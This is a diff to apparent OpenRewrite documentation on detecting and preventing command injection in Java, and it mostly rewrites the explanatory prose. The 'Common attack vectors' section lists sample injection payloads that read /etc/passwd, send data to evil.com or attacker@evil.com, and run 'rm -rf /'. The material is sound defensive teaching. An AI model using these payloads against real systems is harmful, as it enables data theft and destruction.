@@ -2,15 +2,17 @@
 description: Detect and prevent command injection vulnerabilities in Java applications.
 ---
 
-# Command Injection Detection
+# Command injection detection
 
 Command injection vulnerabilities occur when untrusted data is passed to system commands, allowing attackers to execute arbitrary commands on the host operating system. This can lead to complete system compromise, data theft, or service disruption.
 
 ## Understanding command injection
 
-Imagine giving someone remote control of your computer's command line. They could delete files, install malware, steal data, or shut down your system. Command injection vulnerabilities provide exactly this level of access to attackers through your application.
+Command injection is like handing your house keys to a stranger when they asked to borrow a pen. When your application executes system commands with user input, you're essentially letting users type commands directly into your server's terminal. An attacker can chain their own commands onto yours, turning a simple file operation into a full system compromise.
 
 ### The danger illustrated
+
+A single vulnerable line of code can destroy your entire system. This example shows how an innocent-looking file viewer becomes a weapon for attackers:
 
 ```java
 // VULNERABLE: User input directly in command
@@ -27,6 +29,8 @@ Process p = Runtime.getRuntime().exec("cat /logs/" + filename);
 The `FindCommandInjection` recipe tracks untrusted data flowing into command execution methods:
 
 ### 1. Command execution sinks
+
+These are the Java methods that actually run system commands. Think of them as the bridges between your Java application and the operating system's command line. OpenRewrite watches for untrusted data flowing into any of these methods:
 
 ```java
 // Runtime execution
@@ -45,6 +49,8 @@ executor.execute(cmdLine)
 
 ### 2. Common attack vectors
 
+Attackers use special shell characters to break out of your intended command and inject their own. These characters act like escape hatches, allowing attackers to end your command and start their own malicious ones:
+
 ```java
 // Shell metacharacters that enable command chaining
 ; && || | ` $() > < >> << & \n \r
@@ -53,13 +59,15 @@ executor.execute(cmdLine)
 "file.txt; cat /etc/passwd"          // Command chaining
 "file.txt && curl evil.com/steal"    // Conditional execution  
 "file.txt | mail attacker@evil.com"  // Pipe to another command
-"$(cat /etc/passwd)"                  // Command substitution
-"`rm -rf /`"                          // Backtick execution
+"$(cat /etc/passwd)"                 // Command substitution
+"`rm -rf /`"                         // Backtick execution
 ```
 
 ## Vulnerable patterns
 
 ### Basic command injection
+
+The most common mistake is concatenating user input directly into a command string. It's tempting because it's simple, but it's also catastrophically dangerous:
 
 ```java
 // VULNERABLE - Direct concatenation
@@ -74,6 +82,8 @@ public String backup(@RequestParam String directory) {
 
 ### Array-based commands (still vulnerable)
 
+Many developers think using array syntax makes them safe from injection. Unfortunately, if you're still invoking a shell with `sh -c`, you're still vulnerable. The shell will interpret special characters regardless of how you pass them:
+
 ```java
 // VULNERABLE - Even with array syntax
 @GetMapping("/ping")
@@ -87,6 +97,8 @@ public String ping(@RequestParam String host) {
 
 ### ProcessBuilder vulnerabilities
 
+ProcessBuilder is Java's newer, safer way to run commands – but only if you use it correctly. When you invoke a shell through ProcessBuilder, you're right back to square one with injection vulnerabilities:
+
 ```java
 // VULNERABLE - ProcessBuilder with shell
 @PostMapping("/convert")
@@ -99,6 +111,8 @@ public void convertFile(@RequestParam String input, @RequestParam String output)
 ```
 
 ### Path traversal in commands
+
+Combining path traversal with command injection creates a double threat. Attackers can both escape your intended directory and execute arbitrary commands:
 
 ```java
 // VULNERABLE - Path traversal + command injection
@@ -115,7 +129,8 @@ public String viewLog(@RequestParam String logfile) {
 
 ### Avoid shell invocation
 
-The safest approach is to avoid shell interpretation entirely.
+The golden rule of command execution: never invoke a shell unless absolutely necessary. When you bypass the shell and execute commands directly, special characters lose their power. They become just regular characters that can't break out of your command:
+
 ```java
 // SAFE - Direct command without shell
 @GetMapping("/disk-usage")
@@ -150,7 +165,8 @@ public void compressFile(@RequestParam String filename) {
 
 ### Input validation and sanitization
 
-When shell execution is unavoidable, strictly validate input.
+Sometimes you genuinely need shell features like pipes or wildcards. In these rare cases, treat user input like a ticking time bomb. Validate everything, trust nothing, and maintain a strict allowlist of safe characters:
+
 ```java
 public class CommandSanitizer {
     // Whitelist allowed characters
@@ -182,7 +198,8 @@ public class CommandSanitizer {
 
 ### Use higher-level APIs
 
-Prefer Java APIs over system commands.
+Why call out to the operating system when Java can do it natively? Using Java's built-in file and process APIs eliminates command injection entirely. Plus, your code becomes more portable and often runs faster:
+
 ```java
 // INSTEAD OF: Runtime.exec("mkdir -p " + path)
 // USE:
@@ -205,7 +222,8 @@ Files.walk(Paths.get(dir))
 
 ### Parameterized commands
 
-When external commands are necessary, use parameterization.
+When you absolutely must run external commands, treat them like SQL prepared statements. Define command templates with placeholders, then safely substitute validated values. This pattern prevents injection while still allowing flexibility:
+
 ```java
 public class SafeCommandExecutor {
     private static final Map<String, String[]> ALLOWED_COMMANDS = Map.of(
@@ -246,7 +264,8 @@ public class SafeCommandExecutor {
 
 ### Context-aware analysis
 
-The recipe considers how data flows through the program.
+OpenRewrite doesn't just look at individual lines — it follows data as it flows through your entire application. Tainted data remains tainted no matter how many methods it passes through, ensuring that laundering attempts don't hide vulnerabilities:
+
 ```java
 // Tracks through method calls
 public void processFile(HttpServletRequest request) {
@@ -266,7 +285,8 @@ private String buildCommand(String input) {
 
 ### Detecting laundered input
 
-Even "cleaned" input might still be dangerous.
+Partial sanitization is often worse than no sanitization — it gives a false sense of security. Attackers have dozens of ways to inject commands, and if you only block a few, you're still vulnerable:
+
 ```java
 // STILL VULNERABLE - Incomplete sanitization
 public void execute(String userInput) {
@@ -284,7 +304,8 @@ public void execute(String userInput) {
 
 ### Windows vs. Unix commands
 
-Different platforms have different dangerous characters.
+Command injection isn't one-size-fits-all. Windows and Unix systems have different shells with different special characters. Your validation needs to account for the platform where your code will run:
+
 ```java
 public class PlatformAwareValidator {
     public boolean isSafeForPlatform(String input) {
@@ -301,7 +322,8 @@ public class PlatformAwareValidator {
 
 ### Docker and container commands
 
-Special care with container orchestration.
+Containers add another layer of complexity to command injection. When you're building Docker commands dynamically, you're not just risking the container — you might be exposing the host system too:
+
 ```java
 // VULNERABLE - Docker command injection
 @PostMapping("/container/run")
@@ -315,6 +337,8 @@ public void runContainer(@RequestParam String image, @RequestParam String cmd) {
 ## Testing command injection detection
 
 ### Unit tests
+
+Testing your command injection detection ensures you catch vulnerabilities during development, not after deployment. These tests demonstrate patterns that should trigger warnings and safe patterns that shouldn't:
 
 ```java
 @Test
@@ -369,6 +393,8 @@ void detectsProcessBuilderInjection() {
 
 ### Environment variables
 
+Environment variables from the system are generally safer than user input, but they can still be manipulated in some contexts. The key is understanding your threat model and coding defensively:
+
 ```java
 // May be flagged but could be safe if properly controlled
 String javaHome = System.getenv("JAVA_HOME");
@@ -380,6 +406,8 @@ Process p = Runtime.getRuntime().exec(new String[]{javaPath.toString(), "-versio
 ```
 
 ### Configuration-based commands
+
+Commands from configuration files might be flagged even though they're relatively safe. The safety depends on who controls the configuration and how it's protected:
 
 ```java
 // From trusted configuration file
@@ -413,6 +441,8 @@ Several major vulnerabilities have been command injection:
 ## Integration with CI/CD
 
 ### Pre-commit hook
+
+Catching command injection before code reaches your repository is your first line of defense. This simple git hook runs OpenRewrite's detection automatically and blocks commits containing vulnerabilities:
 
 ```bash
 #!/bin/bash
